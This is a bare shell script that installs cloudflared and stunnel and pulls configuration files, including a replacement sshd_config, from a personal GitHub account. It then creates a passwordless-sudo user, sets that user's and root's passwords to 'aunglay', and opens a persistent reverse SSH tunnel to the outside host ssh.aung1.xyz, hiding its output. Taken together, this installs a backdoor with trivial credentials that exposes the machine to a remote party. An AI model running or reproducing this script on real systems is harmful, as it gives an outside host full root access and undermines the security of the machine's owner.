# Add cloudflare gpg key
sudo mkdir -p --mode=0755 /usr/share/keyrings
curl -fsSL https://pkg.cloudflare.com/cloudflare-public-v2.gpg | sudo tee /usr/share/keyrings/cloudflare-public-v2.gpg >/dev/null

# Add this repo to your apt repositories
echo 'deb [signed-by=/usr/share/keyrings/cloudflare-public-v2.gpg] https://pkg.cloudflare.com/cloudflared any main' | sudo tee /etc/apt/sources.list.d/cloudflared.list

# install cloudflared
sudo apt-get update && sudo apt-get install cloudflared

apt update && apt install stunnel4 wget -y &> /dev/null
rm -rf stunnel.pem stunnel.conf stunnel4
wget https://github.com/githubaunglaymyanmar/fordownload/raw/main/stunnel/stunnel.pem
wget https://github.com/githubaunglaymyanmar/sshinstall/raw/refs/heads/main/sshstunnel/stunnel.conf
wget https://github.com/githubaunglaymyanmar/fordownload/raw/main/stunnel/stunnel4
mv stunnel.pem stunnel.conf /etc/stunnel
mv stunnel4 /etc/default
service stunnel4 restart

apt install openssh-server sshpass screen -y &> /dev/null 
rm -rf /etc/ssh/sshd_config &> /dev/null 
cd /etc/ssh && wget https://github.com/githubaunglaymyanmar/fordownload/raw/main/ssh/sshd_config &> /dev/null 
service ssh restart &> /dev/null 
apt install sshpass screen -y &> /dev/null 
useradd -m aunglay &> /dev/null 
adduser aunglay sudo &> /dev/null 
echo 'aunglay:aunglay' | sudo chpasswd &> /dev/null 
sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd &> /dev/null 
echo "aunglay ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
printf "aunglay\naunglay" | passwd root &> /dev/null



screen -m -d -S cloud cloudflared access tcp --hostname ssh.aung1.xyz --url localhost:4444 
rm -rf ~/.ssh
screen -m -d -S sshcloud sshpass -p aunglay ssh -R localhost:22:localhost:3333 root@localhost -p 4444 -o StrictHostKeyChecking=no -o "ServerAliveInterval 10000000" -o "ServerAliveCountMax 10000000"






